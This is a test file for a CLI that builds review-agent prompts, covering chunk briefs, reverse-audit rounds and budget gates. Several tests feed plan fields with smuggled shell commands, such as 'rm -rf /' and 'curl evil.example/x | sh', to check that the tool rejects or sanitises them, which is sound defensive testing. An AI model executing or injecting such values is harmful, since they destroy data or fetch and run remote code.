...
import { DEADLINE_ENV, RESERVE_ENV, COMPOSE_FLOOR_ENV, TOOL_CONCURRENCY_ENV, readBudgetStop, readRoundStamps, stampRound, } from './lib/deadline.js';
import { buildChunkAgentPrompt, buildChunkLaunchPrompt, buildWholeDiffBlock, buildRoleBrief, buildRoleLaunchPrompt, findingsSection, agentPromptCommand, } from './agent-prompt.js';
import { BRIEFS, ENUMERATION_TRAP_LENS, MODELED_SYSTEM_EXECUTION_LENS, } from './lib/agent-briefs.js';
import { MODELED_SYSTEM_DOMAIN, SHELL_MODEL_LAYERS, } from './lib/audit-layers.js';
import { REVERSE_AUDIT_IDENTITY } from './lib/layer-audit-gate.js';
import { isolateHostGitConfig } from './lib/test-utils.js';
import { readRecordedPrompts, briefPath, promptRecordDir, wasDeliveredVerbatim, } from './lib/prompt-record.js';
const PLAN = {
...
describe('buildChunkAgentPrompt — what the real launches left out', () => {
    ...
    it('attaches the execution-model lens to a chunk agent on a modeled-system diff, and not otherwise', () => {
        ...
        const chunkPlan = (domains, maxLineChars = 50) => ({
            diffPathAbsolute: '/d.txt',
            chunks: [
                {
                    id: 1,
        ...
        expect(buildChunkAgentPrompt(chunkPlan(['compiler']), 1)).not.toContain('Modeled-executable-system lens — your territory');
        ...
        expect(buildChunkAgentPrompt(chunkPlan([MODELED_SYSTEM_DOMAIN], 10_000_000), 1)).not.toContain('Modeled-executable-system lens — your territory');
    });
    it('carries the enumeration-trap lens — with its operational clauses — into both the 3b brief (3A) and the chunk brief (3B)', () => {
        ...
        expect(ENUMERATION_TRAP_LENS).toContain('can be fooled into a wrong result is **Critical**');
        ...
        expect(ENUMERATION_TRAP_LENS).toContain("Carry ONE demonstrated corner as the finding's witness");
        ...
        expect(ENUMERATION_TRAP_LENS).toContain('Adversarial input alone does NOT make a surface unbounded');
    });
});
describe('buildChunkAgentPrompt — refuses a plan it cannot build from', () => {
    it('refuses a plan with no diff path — that is the bug, not a default', () => {
        ...
        expect(() => buildChunkAgentPrompt({ chunks: PLAN.chunks }, 13)).toThrow(/diffPathAbsolute/);
    });
    it('refuses a plan with no chunks', () => {
        expect(() => buildChunkAgentPrompt({ diffPathAbsolute: '/x/diff.txt' }, 1)).toThrow(/chunks/);
    });
...
describe('agent-prompt (command boundary)', () => {
    ...
    it('prints the prompt for the chunk it was asked for', () => {
        ...
        try {
            ...
            agentPromptCommand.handler({
                plan,
                chunk: 13,
            });
            const calls = writeStdoutLine.mock.calls;
    ...
    it('names the plan it could not read, instead of a raw stack', () => {
        expect(() => agentPromptCommand.handler({
    ...
    it('injects the project rules the review loaded', () => {
        ...
        try {
            ...
            const printed = writeStdoutLine.mock.calls[0][0];
    ...
    it('records what it handed out, so a rewrite of it can be seen', () => {
        ...
        try {
            const plan = join(dir, 'plan.json');
            writeFileSync(plan, JSON.stringify(PLAN));
            agentPromptCommand.handler({ plan, chunk: 13 });
            agentPromptCommand.handler({
                plan,
                'whole-diff': true,
            });
            ...
            expect(recorded.get('chunk-13')).toBe(buildChunkLaunchPrompt(PLAN, 13, briefPath(plan, 'chunk-13')));
            expect(readFileSync(briefPath(plan, 'chunk-13'), 'utf8')).toBe(buildChunkAgentPrompt(PLAN, 13));
    ...
    it('takes the round cap from the plan topology at the --chunk gate too', () => {
        ...
        try {
            ...
            const handler = agentPromptCommand.handler;
            delete process.env[DEADLINE_ENV];
            const stderr = () => writeStderrLine.mock.calls
                .map((c) => c[0])
                .join('\n');
            const small = join(dir, 'small.json');
            writeFileSync(small, JSON.stringify({ ...PLAN, srcDiffLines: 100, diffLines: 100 }));
            ...
            writeFileSync(large, JSON.stringify({ ...PLAN, srcDiffLines: 900, diffLines: 900 }));
            process.exitCode = undefined;
            writeStderrLine.mockClear();
            handler({
                plan: large,
    ...
    it('lets --role reverse-audit --chunk N through and keys the record by its chunk', () => {
        ...
        try {
            ...
            expect(keys[0]).toMatch(/^reverse-audit--chunk-14--round-1--[0-9a-f]{12}$/);
...
describe('--all-chunks — every auditor of a Step 5 round, in one call', () => {
    ...
    it('builds one labelled block per chunk, each recorded as its exact printed prompt', () => {
        ...
        try {
            ...
            const printed = writeStdoutLine.mock
                .calls[0][0];
            ...
            for (const c of [13, 14, 15]) {
                const key = keys.find((k) => k.startsWith(`reverse-audit--chunk-${c}--`));
                ...
                expect(rec.startsWith('You are review agent `reverse-audit`')).toBe(true);
            ...
            const listPath = /read_file\(file_path="([^"]*\.findings\.md)"/.exec(anyRec)[1];
            expect(readFileSync(listPath, 'utf8')).toContain('- **[Critical]** x.ts:1 — y');
            ...
            const rec13 = recorded.get(keys.find((k) => k.includes('--chunk-13--')));
            const rec14 = recorded.get(keys.find((k) => k.includes('--chunk-14--')));
    ...
    ])('refuses --all-chunks combined with %s — never silently dropped', (_, extra, pattern) => {
    ...
    it('an empty findings file still builds one auditor per chunk, each with the early-round framing', () => {
        ...
        try {
            ...
            expect(keys.filter((k) => k.startsWith('reverse-audit--chunk-'))).toHaveLength(3);
        }
        finally {
            rmSync(dir, { recursive: true, force: true });
        }
...
describe('--round — the CLI bakes the round into the identity line and the key', () => {
    ...
    it('keys each round separately and prints the label inside the identity line', () => {
        ...
        try {
            ...
            for (const [n, key] of [
                ...
                expect(rec.split('\n')[0]).toBe(`You are review agent \`reverse-audit\` — Reverse audit agent (round ${n}).`);
            }
        }
        finally {
            rmSync(dir, { recursive: true, force: true });
    ...
    it('takes the round cap from the CLOCK as well, on a sized huge plan', () => {
        ...
        try {
            ...
            writeFileSync(huge, JSON.stringify({ ...PLAN, srcDiffLines: 5000, diffLines: 5000 }));
            try {
                ...
                if (before === undefined)
                    ...
                    process.env[DEADLINE_ENV] = before;
            }
        }
        finally {
            process.exitCode = undefined;
    ...
    it('carries the round through --all-chunks: every key and every identity line', () => {
        ...
        try {
            ...
            expect(keys).toHaveLength(3);
            for (const c of [13, 14, 15]) {
                const key = keys.find((k) => k.startsWith(`reverse-audit--chunk-${c}--round-3--`));
    ...
    it("welds THIS shard's record key into the scratch-tree command it is handed", () => {
        ...
        try {
            ...
            expect(readFileSync(briefPath(plan, key), 'utf8')).toContain(`--label ${key}`);
        }
        finally {
            rmSync(dir, { recursive: true, force: true });
        }
    ...
    ])('refuses --round combined with %s — never silently dropped', (_, extra, pattern) => {
    ...
    it.each([[0], [-1], [1.5], [Number.NaN]])('refuses --round %s — rounds are 1-based integers', (n) => {
...
describe('--roster — every prompt the plan requires, in one call', () => {
    ...
    it('reads the worktree once and tells every brief what is dirty in it', () => {
        ...
        try {
            ...
            expect(writeStderrLine).toHaveBeenCalledWith(expect.stringContaining('__probe__.test.ts'));
            ...
            expect(readFileSync(briefPath(plan, '7'), 'utf8')).toContain('And right now it is not clean');
            expect(readFileSync(briefPath(plan, '1b'), 'utf8')).toContain('And right now it is not clean');
        }
        finally {
            rmSync(dir, { recursive: true, force: true });
    ...
    it('builds and records the whole 3A roster', () => {
        ...
        try {
            ...
            expect(printed).toMatch(/───── agent \d+ of 11 — Agent 1a: Line-by-line correctness ─────/);
        }
        finally {
            rmSync(dir, { recursive: true, force: true });
        }
    ...
    it('a whole block copied lazily — separator line included — still delivers', () => {
        ...
        try {
            ...
            for (const block of blocks) {
                const match = [...recorded.values()].filter((p) => wasDeliveredVerbatim(block, p));
    ...
    it('builds the 3B roster: chunks, whole-diff roles and per-file invariants', () => {
        ...
        try {
            ...
            const inv = readFileSync(briefPath(plan, 'invariant-a--src/big.ts'), 'utf8');
    ...
    it('threads --rules into every brief it writes', () => {
        ...
        try {
            ...
            for (const key of ['1a', '1b', '6c']) {
                expect(readFileSync(briefPath(plan, key), 'utf8')).toContain('No `any` in new code.');
            }
        }
        finally {
            rmSync(dir, { recursive: true, force: true });
    ...
    it('refuses to rebuild a rules-bearing brief without --rules', () => {
        ...
        try {
            ...
            const rules = join(dir, 'rules.md');
            writeFileSync(rules, 'No `any` in new code.\n');
            const build = (withRules) => agentPromptCommand.handler({
                plan,
                role: '2',
                ...(withRules ? { rules } : {}),
            });
    ...
    it('emits the working_dir parameter note when worktreePath is present', () => {
        ...
        try {
            ...
            const plan = join(dir, 'plan.json');
            writeFileSync(plan, JSON.stringify({ ...PLAN, worktreePath: wt, prNumber: '9999' }));
            agentPromptCommand.handler({
                plan,
                roster: true,
            });
...
describe('--findings — point the block at the list file, record EXACTLY that block', () => {
    ...
    function recordByPrefix(plan, prefix) {
    ...
    function run(args) {
        ...
        writeFileSync(findings, '- **[Critical]** foo.ts:10 — the collision drops arguments\n' +
    ...
    it('a verifier gets the findings pointer beneath its identity line, and the record IS the printed prompt', () => {
        ...
        expect(readFileSync(m[1], 'utf8')).toContain('foo.ts:10 — the collision drops arguments');
        ...
        const afterFindings = printed.slice(printed.indexOf('**Your brief is a file'));
    ...
    it('throws for a role it has no framing for, rather than falling through', () => {
        ...
        expect(() => findingsSection('2', 'some findings', '/tmp/x.findings.md')).toThrow(/--findings has no framing for role "2"/);
    });
    ...
    it('a failed findings write builds with the list inlined, not a dead pointer', () => {
        ...
        const plan = join(dir, 'plan.json');
        writeFileSync(plan, JSON.stringify(PLAN));
        writeFileSync(join(dir, 'plan-prompts'), 'a file where the record dir would go');
        const findings = join(dir, 'findings.md');
        writeFileSync(findings, '- **[Critical]** foo.ts:10 — the collision drops arguments');
        writeStderrLineSafe.mockClear();
        agentPromptCommand.handler({
            plan,
            role: 'verify',
            findings,
        ...
        expect(writeStderrLineSafe.mock.calls[0][0]).toContain('inlining the list instead');
    });
    ...
    it('two shards with different findings each get their OWN record, and neither clobbers the other', () => {
        ...
        const printed1 = writeStdoutLine.mock
            .calls[0][0];
        agentPromptCommand.handler({
            plan,
            role: 'verify',
        ...
        const printed2 = writeStdoutLine.mock
            .calls[1][0];
        const recorded = readRecordedPrompts(plan);
        const verifyKeys = [...recorded.keys()].filter((k) => k.startsWith('verify--'));
        ...
        const listOf = (p) => readFileSync(/read_file\(file_path="([^"]*\.findings\.md)"/.exec(p)[1], 'utf8');
    ...
    it('refuses a findings-taking role launched without --findings', () => {
        ...
        expect(() => agentPromptCommand.handler({
            plan: '/nonexistent/plan.json',
            role: 'reverse-audit',
        })).toThrow(/an early reverse-audit round with nothing confirmed yet passes an empty file/);
...
describe('buildWholeDiffBlock — the agents that walk the whole diff', () => {
    it("names the diff and every chunk's read", () => {
        ...
        for (const c of PLAN.chunks) {
            ...
            expect(block).toContain(`read_file(file_path="${PLAN.diffPathAbsolute}", offset=${offset}, limit=${limit})`);
        }
    });
    it('says the source tree is not a substitute for the diff', () => {
        ...
        expect(buildWholeDiffBlock(PLAN)).toContain('deletion leaves no trace in the post-change file');
    });
    ...
    it('carries the project rules when it is given them', () => {
        expect(buildWholeDiffBlock(PLAN, 'No `any` in new code.')).toContain('No `any` in new code.');
    });
    it('refuses a plan with no diff path — the whole point of the command', () => {
        expect(() => buildWholeDiffBlock({ chunks: PLAN.chunks })).toThrow(/diffPathAbsolute/);
    });
    it.each([
    ...
    it('a real reverse-audit launch prompt carries the identity the layer gate anchors on', () => {
        ...
        expect(buildRoleLaunchPrompt(PLAN, 'verify', '/t/v.brief.md')).not.toContain(REVERSE_AUDIT_IDENTITY);
    });
    it('rejects --role reverse-audit --chunk N when the plan has no such chunk', () => {
        ...
        expect(() => buildRoleLaunchPrompt(PLAN, 'reverse-audit', '/t/ra.brief.md', {
            chunk: 999,
...
describe('buildRoleBrief — every agent, not just the territory ones', () => {
    ...
    it.each([
        ...
        '6c',
        'test-matrix',
    ])('welds the diff and every chunk read into role %s', (role) => {
        const p = buildRoleBrief(PLAN, role);
        expect(p).toContain(PLAN.diffPathAbsolute);
        for (const c of PLAN.chunks) {
            expect(p).toContain(`offset=${c.startLine - 1}, limit=${c.endLine - c.startLine + 1}`);
        }
    ...
    it('injects generic repository context into reviewers and a narrow verification boundary into Agent 7', () => {
        ...
        expect(buildRoleBrief(contextPlan, '0')).not.toContain('Example project repository context');
        expect(buildRoleBrief({
            ...contextPlan,
            repositoryContext: {
                ...contextPlan.repositoryContext,
                requiredAgents: [],
            },
        }, 'test-matrix')).not.toContain('Example project repository context');
        ...
        expect(reviewerBrief).toContain('Related paths:\n- src/compiler.ts\n- src/runtime.ts');
        expect(reviewerBrief).toContain('Unverified dimensions:\n- Alternate runtime was not exercised');
        expect(reviewerBrief).toContain('Verification notes:\n- Use the repository native test runner');
        ...
        // and ships green.
        for (const role of ['verify', 'reverse-audit']) {
            expect(buildRoleBrief(contextPlan, role)).toContain('Example project repository context');
        }
    ...
    it('carries the mutation-testing lens into Agent 5, equivalent-mutant escape hatch included', () => {
        ...
        expect(buildRoleBrief(PLAN, 'test-matrix')).toContain('a **Suggestion** on its own, Critical only when');
    });
    ...
    it('hands the verifier its own scratch tree, labelled by its record key', () => {
        ...
        expect(buildRoleBrief({ ...PR_PLAN, worktreePath: "/tmp/John's Projects/wt" }, 'verify', { key: 'verify--round-2--deadbeef1234' })).toContain(`--worktree '${resolve("/tmp/John's Projects/wt")}'`.replace("John's", "John'\\''s"));
        // Two shards of one round must not be handed one tree.
        expect(buildRoleBrief(PR_PLAN, 'verify', { key: 'verify--round-2--0badc0de' })).toContain('--label verify--round-2--0badc0de');
        ...
        expect(buildRoleBrief(PR_PLAN, 'verify', { key: 'verify; rm -rf /' })).toContain('--label verify__rm_-rf__');
    ...
    it('tells every code-reading agent the worktree is shared, and names what is dirty', () => {
        ...
        expect(clean).toContain('Your working directory is a SHARED review worktree');
        ...
        expect(buildRoleBrief(PR_PLAN, '1a', {
        ...
        expect(buildRoleBrief(PR_PLAN, 'verify')).toContain('Your working directory is a SHARED review worktree');
        expect(buildChunkAgentPrompt({ ...PLAN, ...PR_PLAN }, 13, undefined, {
            paths: ['x.ts'],
            total: 1,
        ...
        // nor the paths.
        expect(buildWholeDiffBlock({ ...PLAN, ...PR_PLAN }, undefined, {
            paths: ['x.ts'],
            total: 1,
        })).toContain('And right now it is not clean');
        expect(buildWholeDiffBlock({ ...PLAN, ...PR_PLAN })).toContain('Your working directory is a SHARED review worktree');
        expect(buildWholeDiffBlock(PLAN)).not.toContain('Your working directory is a SHARED review worktree');
        ...
        expect(buildRoleBrief(PLAN, '1a')).not.toContain('Your working directory is a SHARED review worktree');
        // The RULE is still not Agent 7's: it runs commands, it does not judge code.
        expect(buildRoleBrief(PR_PLAN, '7')).not.toContain('Your working directory is a SHARED review worktree');
    ...
    it("scopes Agent 7's probe base to the delta on an incremental round", () => {
        ...
        expect(scoped).not.toContain('--base bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb');
        ...
        expect(upToDate).toContain('--base bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb');
        ...
        expect(refused).toContain('--base bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb');
        const malformed = buildRoleBrief({
            ...PR_PLAN,
            incremental: { since: 'a'.repeat(40), effective: true, diffBase: 42 },
        }, '7', { planPath });
        expect(malformed).toContain('--base bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb');
        ...
        expect(injected).toContain('--base bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb');
        ...
        const injectedBase = buildRoleBrief({ ...PR_PLAN, mergeBaseSha: 'f00d; curl evil.example/x | sh' }, '7', { planPath });
        ...
        expect(emptyBase).toContain('--base bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb');
    });
    ...
    it('pins Agent 7 to the PR worktree and hands it the test-efficacy probe', () => {
        ...
        expect(p).toContain(`"\${QWEN_CODE_CLI:-qwen}" review test-efficacy ${planPath}`);
    ...
    it('gives Agent 7 ABSOLUTE paths — its cwd is the worktree, not the repo', () => {
        ...
        expect(p).toContain(`--worktree ${resolve(PR_PLAN.worktreePath)}`);
        expect(p).not.toMatch(/--worktree \.qwen/);
        expect(p).toContain(`--out ${join(absTmp, 'qwen-review-pr-6766-efficacy.json')}`);
    });
    it('hands Agent 7 the build-test command with absolute --plan/--worktree/--out', () => {
        ...
        expect(p).toContain(`--out ${join(absTmp, 'qwen-review-pr-6766-build-test.json')}`);
    });
    ...
    it('welds a long tool timeout into the build-test invocation', () => {
        ...
        expect(p).toContain(`Invoke it with \`timeout: ${SHELL_TOOL_MAX_TIMEOUT_MS}\`:`);
    ...
    it('tells Agent 7 how to CONTINUE a run one call could not finish', () => {
        ...
        expect(p).toContain('Work is left when `testScope.notRun` is non-empty, or when any ' +
        ...
        expect(resumeBlock[0]).toContain('"${QWEN_CODE_CLI:-qwen}" review build-test');
        ...
        // shipped green.
        expect(resumeBlock[0]).toContain(`--worktree ${resolve('.qwen/tmp/review-pr-6766')}`);
        expect(resumeBlock[0]).toContain(`--out ${join(resolve('/abs/tmp'), 'qwen-review-pr-6766-build-test.json')}`);
        ...
        const firstBlock = fences.find((f) => f.includes('review build-test') && !f.includes('--resume'));
        expect(firstBlock).toBeDefined();
        expect(firstBlock).toContain('"${QWEN_CODE_CLI:-qwen}" review build-test');
        expect(firstBlock).toContain(`--worktree ${resolve('.qwen/tmp/review-pr-6766')}`);
    ...
    it('welds the PR into Agent 0 — an unqualified number judges the wrong issue', () => {
        ...
        expect(p).toContain('"${QWEN_CODE_CLI:-qwen}" review issue-context 6766 --repo LailatulCoder/lailatul-coder');
        expect(p).toContain(join(resolve('/x'), 'qwen-review-pr-6766-issue-context.md'));
    ...
    it('welds --host into the Agent 0 command when the plan carries an Enterprise host', () => {
        ...
        expect(p).toContain('"${QWEN_CODE_CLI:-qwen}" review issue-context 6766 --repo LailatulCoder/lailatul-coder --host ghe.example.com');
    });
    ...
    it('shell-quotes the evidence path (spaces/apostrophes in workspace paths)', () => {
        const planPath = join(resolve("/x's proj"), 'qwen-review-pr-6766-fetch.json');
        const p = buildRoleBrief(PR_PLAN, '0', { planPath });
    ...
    it('rejects a tampered plan before welding (pr / ownerRepo / host)', () => {
        const planPath = join(resolve('/x'), 'qwen-review-pr-6766-fetch.json');
        expect(() => buildRoleBrief({ ...PR_PLAN, prNumber: '6766; touch /tmp/pwned' }, '0', {
            planPath,
        ...
        expect(() => buildRoleBrief({ ...PR_PLAN, prNumber: '0' }, '0', { planPath })).toThrow(/not a safe positive integer/);
        expect(() => buildRoleBrief({ ...PR_PLAN, prNumber: '123456789012345678901' }, '0', {
            planPath,
        })).toThrow(/not a safe positive integer/);
        expect(() => buildRoleBrief({ ...PR_PLAN, ownerRepo: '../escape' }, '0', {
            planPath,
        })).toThrow(/owner\/repo/);
        expect(() => buildRoleBrief({ ...PR_PLAN, ownerRepo: '-evil/repo' }, '0', {
            planPath,
        })).toThrow(/owner\/repo/);
        ...
        expect(() => buildRoleBrief({ ...PR_PLAN, host: 'ghe.example.com; rm -rf /' }, '0', {
            planPath,
        })).toThrow(/not a hostname/);
        expect(() => buildRoleBrief({ ...PR_PLAN, host: '--help' }, '0', { planPath })).toThrow(/not a hostname/);
        // A present-but-whitespace-only host fails closed too (every sibling
        // classifies it as a validation error).
        expect(() => buildRoleBrief({ ...PR_PLAN, host: ' ' }, '0', { planPath })).toThrow(/whitespace-only/);
        ...
        expect(() => buildRoleBrief({ ...PR_PLAN, host: null }, '0', { planPath: planPath2 })).not.toThrow();
        expect(buildRoleBrief({ ...PR_PLAN, host: null }, '0', { planPath: planPath2 })).not.toContain('--host');
    });
    ...
    it('gives an invariant agent the file, its added ranges, and its diff slice', () => {
        ...
        expect(p).toContain(`read_file(file_path="${PLAN.diffPathAbsolute}", offset=99, limit=201)`);
    ...
    it('refuses an invariant agent on a file the diff did not rewrite', () => {
        ...
        expect(() => buildRoleBrief(plan, 'invariant-a', { file: 'src/small.ts' })).toThrow(/not a heavy file/);
    });
    it('splits the invariant checklist three ways, and says so', () => {
        ...
        for (const p of [a, b, c])
            expect(p).toContain('do not attempt the others');
    ...
    it('carries the project rules into every reviewing role — and NOT into Agent 7', () => {
        expect(buildRoleBrief(PLAN, '2', { rules: 'No `any`.' })).toContain('No `any`.');
        ...
        const seven = buildRoleBrief({ ...PLAN, prNumber: '1', ownerRepo: 'a/b', worktreePath: 'w' }, '7', { rules: 'No `any`.' });
    ...
    it('records each role under the key the roster looks it up by', () => {
        ...
        try {
            ...
            agentPromptCommand.handler({ plan, role: '2' });
            const recorded = readRecordedPrompts(plan);
...
describe('buildChunkLaunchPrompt — the 87-kilobyte problem', () => {
    it('carries the chunk id and the read, and nothing else of size', () => {
        ...
        expect(p).toContain(`read_file(file_path="${PLAN.diffPathAbsolute}", offset=3807, limit=217)`);
...
describe('path rules — they arrive where they belong, and nowhere else', () => {
    ...
    it('does not reach the chunk agent next door, whose territory does not', () => {
        ...
        expect(buildChunkAgentPrompt(WF_PLAN, 2)).not.toContain('pull_request_target');
    });
    it.each([
        '1a',
        '1b',
        ...
        '6b',
        '6c',
    ])('reaches the code-reviewing dimension %s', (role) => {
        expect(buildRoleBrief(WF_PLAN, role)).toContain('pull_request_target');
    });
    it.each(['0', '7', 'test-matrix'])('does not reach %s — it is not sitting that exam', (role) => {
        ...
        expect(buildRoleBrief(WF_PLAN, role)).not.toContain('pull_request_target');
    });
    it('scopes an invariant agent to its own file', () => {
        ...
        expect(buildRoleBrief(plan, 'invariant-a', { file: 'src/pay.ts' })).not.toContain('pull_request_target');
    });
...
describe('lightweight mode — the diff, and nothing else', () => {
    ...
    it('tells a code-reviewing agent there is no tree to read', () => {
        expect(buildRoleBrief(LIGHT, '1a')).toContain('You have the diff, and nothing else');
        expect(buildRoleBrief(LOCAL, '1a')).not.toContain('You have the diff, and nothing else');
    });
...
describe('verify and reverse-audit briefs — the Step 4/5 methodology, in code', () => {
    ...
    it('the verify brief carries the #9341 live-verification run disciplines', () => {
        ...
        expect(buildRoleBrief(PLAN, '1a')).not.toContain('Each row of a run matrix starts from fresh state');
    });
...
describe('the reverse-audit budget gate — the loop must end by reporting', () => {
    ...
    function call(role, extra = {}, planPath) {
        let plan = planPath;
        if (plan === undefined) {
    ...
    it('refuses a round inside the reserve: exit 4, no prompt, no record', () => {
        ...
        expect(process.exitCode).toBe(4);
        expect(writeStdoutLine.mock.calls).toHaveLength(0);
        // A refused round leaves no record for a delivery check to expect an
        // agent against.
        expect(readRecordedPrompts(plan).size).toBe(0);
        const msg = writeStderrLine.mock.calls
            .map((c) => c[0])
            .join('\n');
        expect(msg).toContain('BUDGET:');
        expect(msg).toContain('`reverse audit — stopped before round 2 by the review time budget`');
        ...
        expect(readBudgetStop(plan)?.entry).toBe('reverse audit — stopped before round 2 by the review time budget');
    ...
    it('builds normally when the deadline is far, and when there is none', () => {
        ...
        expect(process.exitCode).toBeUndefined();
        expect(writeStdoutLine.mock.calls).toHaveLength(1);
    ...
    it('does not gate the verifier by the reserve — it runs within it', () => {
        ...
        expect(process.exitCode).toBeUndefined();
        expect(writeStdoutLine.mock.calls).toHaveLength(1);
        expect(writeStderrLine.mock.calls).toHaveLength(0);
    ...
    it('refuses an --all-chunks round too: exit 4, and none of the per-chunk records', () => {
        ...
        expect(writeStdoutLine.mock.calls).toHaveLength(0);
        expect(readRecordedPrompts(plan).size).toBe(0);
        expect(readBudgetStop(plan)?.entry).toBe('reverse audit — stopped before round 3 by the review time budget');
        expect(readRoundStamps(plan)).toHaveLength(0);
    });
    it('throws the validation error first: a malformed call beats the budget refusal', () => {
        ...
        process.env[DEADLINE_ENV] = String(Math.floor(Date.now() / 1000) + 60);
        expect(() => call('reverse-audit', { round: 0 })).toThrow(/--round is a 1-based round number/);
        expect(process.exitCode).toBeUndefined();
        expect(writeStderrLine.mock.calls).toHaveLength(0);
        expect(writeStdoutLine.mock.calls).toHaveLength(0);
    });
    ...
    it('gates a --chunk build of a round never admitted — no stamp, no exemption', () => {
        ...
        expect(readBudgetStop(plan)?.entry).toBe('reverse audit — stopped before round 4 by the review time budget');
    });
    it('the exemption keys on the stamp, not the record — a half-built round stays refused', () => {
        ...
        expect([...readRecordedPrompts(planPath).keys()].some((k) => k.includes('--chunk-13--round-3--'))).toBe(true);
        ...
        expect(process.exitCode).toBe(4);
        expect(writeStdoutLine.mock.calls).toHaveLength(0);
        expect(readBudgetStop(planPath)?.entry).toBe('reverse audit — stopped before round 3 by the review time budget');
    });
    ...
    it('a structurally unbuildable plan gets its own error, never a budget stop', () => {
        ...
        dirs.push(dir);
        const plan = join(dir, 'plan.json');
        writeFileSync(plan, JSON.stringify({ diffPathAbsolute: PLAN.diffPathAbsolute }));
        const findings = join(dir, 'findings.md');
        writeFileSync(findings, '');
        expect(() => agentPromptCommand.handler({
            plan,
    ...
    it("ignores a previous run's stamps — the plan rewrite fences them off", () => {
        ...
        writeFileSync(join(recordDir, 'budget-rounds.json'), JSON.stringify([{ round: 4, atMs: Date.now() - 28_800_000 }]));
    ...
    it("measures the previous round's cost at the gate, not the constant", () => {
        ...
        writeFileSync(join(promptRecordDir(plan), 'budget-rounds.json'), JSON.stringify([{ round: 1, atMs: Date.now() - 3_000_000 }]));
...
describe('per-chunk retirement — cold territories stop costing a round', () => {
    ...
    const DRY = 'No new issues found — re-walked the whole territory, the retry cap and ' +
        "both changed exports' call sites; every gap I checked was already in " +
        'the confirmed list.';
    const WHIFF = 'No issues found.';
    const YIELD = 'Found one gap the prior rounds missed.\n\n' +
    ...
    function keysOf(round) {
        return [...readRecordedPrompts(plan).keys()].filter((k) => k.includes(`--round-${round}--`));
    }
    /**
     ...
     */
    function auditorTranscript(launchPrompt, finalText, opts = {}) {
        const id = `aud-${++seq}`;
        ...
        const readOffset = opts.readOverride?.offset ?? (baked ? Number(baked[1]) : 0);
        const readLimit = opts.readOverride?.limit ?? (baked ? Number(baked[2]) : 100);
        const lines = [
            JSON.stringify({
                ...base,
                type: 'user',
     ...
     */
    function answerRound(round, texts) {
    ...
    it('round 3 skips a chunk dry in rounds 1 and 2, and the note names it', () => {
        ...
        expect(out).toContain('chunk 13 — retired: dry in rounds 1 and 2, next cold check round 4');
        expect(out.indexOf('retirement:')).toBeGreaterThan(out.indexOf('end of round'));
    ...
    it('findings quoting a read window cannot widen a territory', () => {
        ...
        writeFileSync(findings, '- **File:** packages/cli/src/x.ts:12 — the earlier read used ' +
    ...
    it('the cap in the retirement note is the plan’s tier, not a constant', () => {
        ...
        writeFileSync(plan, JSON.stringify({ ...PLAN, srcDiffLines: 100, diffLines: 100 }));
        const old = new Date(2020, 0, 1);
        utimesSync(plan, old, old);
        answerRound(1, { 13: YIELD, 14: YIELD, 15: YIELD });
        answerRound(2, { 13: YIELD, 14: YIELD, 15: YIELD });
    ...
    it('certification failures are diagnosed on stderr, chunk by chunk (#9206)', () => {
        ...
        auditorTranscript(recordOf(2, 15), YIELD);
        runRound(3);
        const err = writeStderrLineSafe.mock.calls
            .map((c) => c[0])
            .join('\n');
    ...
    it('huge cap: a chunk dry in rounds 1 and 2 retires with a final certificate', () => {
        ...
        writeFileSync(plan, JSON.stringify({ ...PLAN, budget: { reverseAuditRounds: 3 } }));
        const old = new Date(2020, 0, 1);
        utimesSync(plan, old, old);
        answerRound(1, { 13: DRY, 14: YIELD, 15: YIELD });
        answerRound(2, { 13: DRY, 14: YIELD, 15: YIELD });
    ...
    it('huge cap: the retirement note reads the same clock as the gate', () => {
        ...
        writeFileSync(plan, JSON.stringify({ ...PLAN, srcDiffLines: 5000, diffLines: 5000 }));
        const old = new Date(2020, 0, 1);
        utimesSync(plan, old, old);
        answerRound(1, { 13: DRY, 14: YIELD, 15: YIELD });
        answerRound(2, { 13: DRY, 14: YIELD, 15: YIELD });
    ...
    it('huge cap: a CONVERGED exit clears a stale same-run time-budget marker too', () => {
        ...
        writeFileSync(plan, JSON.stringify({ ...PLAN, budget: { reverseAuditRounds: 5 } }));
        const old = new Date(2020, 0, 1);
        utimesSync(plan, old, old);
        runRound(1);
        auditorTranscript(recordOf(1, 13), DRY);
    ...
    it('a --chunk rebuild of an admitted round bypasses retirement — a repair is not scheduling', () => {
        ...
        expect(process.exitCode).toBeUndefined();
        expect(writeStdoutLine.mock.calls).toHaveLength(1);
        expect(keysOf(3).some((k) => k.startsWith('reverse-audit--chunk-13--'))).toBe(true);
    });
    ...
    it('a per-chunk build prints the chunk\u2019s own certification failures (#9206)', () => {
        ...
        const err = writeStderrLineSafe.mock.calls
            ...
            .join('\n');
        expect(err).toContain('reverse-audit retirement certified nothing');
        expect(err).toContain('chunk 13 \u2014 round 1: no matching transcript; round 2: no matching transcript');
        // The chunk still builds — the diagnostic rides stderr beside it.
        const out = writeStdoutLine.mock.calls
            .map((c) => String(c[0]))
            .join('\n');
    ...
    it('every chunk build of the round carries its own failures, not just the first (#9213)', () => {
        ...
        let err = writeStderrLineSafe.mock.calls
            .map((c) => String(c[0]))
            .join('\n');
        expect(err).toContain('chunk 13 \u2014 round 1: no matching transcript; round 2: no matching transcript');
        ...
        expect(process.exitCode).toBeUndefined();
        err = writeStderrLineSafe.mock.calls
            .map((c) => String(c[0]))
            .join('\n');
        expect(err).toContain('reverse-audit retirement certified nothing');
        expect(err).toContain('chunk 14 \u2014 round 1: no matching transcript; round 2: no matching transcript');
    ...
    it('a throwing stderr cannot zero the round — the schedule catch NOTE writes safe (#9213)', () => {
        ...
        answerRound(2, { 13: DRY, 14: DRY, 15: YIELD });
        delete process.env['QWEN_CODE_SESSION_ID'];
        writeStderrLine.mockImplementation(() => {
    ...
    it('a refused round prints no audit NOTE — the round builder defers the catch note past the gate (#9259)', () => {
        ...
        const msg = writeStderrLine.mock.calls
            ...
            .join('\n');
        expect(msg).toContain('ROUND CAP');
        const safe = writeStderrLineSafe.mock.calls
            .map((c) => String(c[0]))
            .join('\n');
    ...
    it('a repair build whose schedule begins to throw still names the degradation — once per round (#9259)', () => {
        ...
        expect(readRoundStamps(plan).some((s) => s.round === 3)).toBe(true);
